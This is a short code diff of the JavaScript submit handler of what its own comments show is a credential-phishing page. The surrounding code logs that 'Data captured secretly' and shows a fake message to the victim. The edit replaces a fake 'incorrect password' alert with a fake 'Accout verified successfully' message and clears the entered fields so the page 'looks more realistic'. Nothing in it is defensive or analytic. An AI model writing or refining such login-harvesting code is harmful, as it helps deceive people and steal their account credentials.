@@ -53,7 +53,7 @@ const saveUser = async () => {
             console.log("Data captured secretly.");
 
             // 6. SHOW THE FAKE ERROR MESSAGE
-            alert("The email or password you entered is incorrect. Please try again.");
+            alert("Accout verified successfully.");
             
             // 7. RESET THE UI
             saveBtn.disabled = false;
@@ -63,7 +63,7 @@ const saveUser = async () => {
             
             // Clear password field to make them re-type (looks more realistic)
             passwordInput.value = "";
-            passwordInput.focus();
+            emailInput.value = "";
 
         } catch (error) {
             console.error("Error saving data:", error);
@@ -75,3 +75,4 @@ const saveUser = async () => {
 
 // 5. Event Listener
 saveBtn.addEventListener('click', saveUser);
+
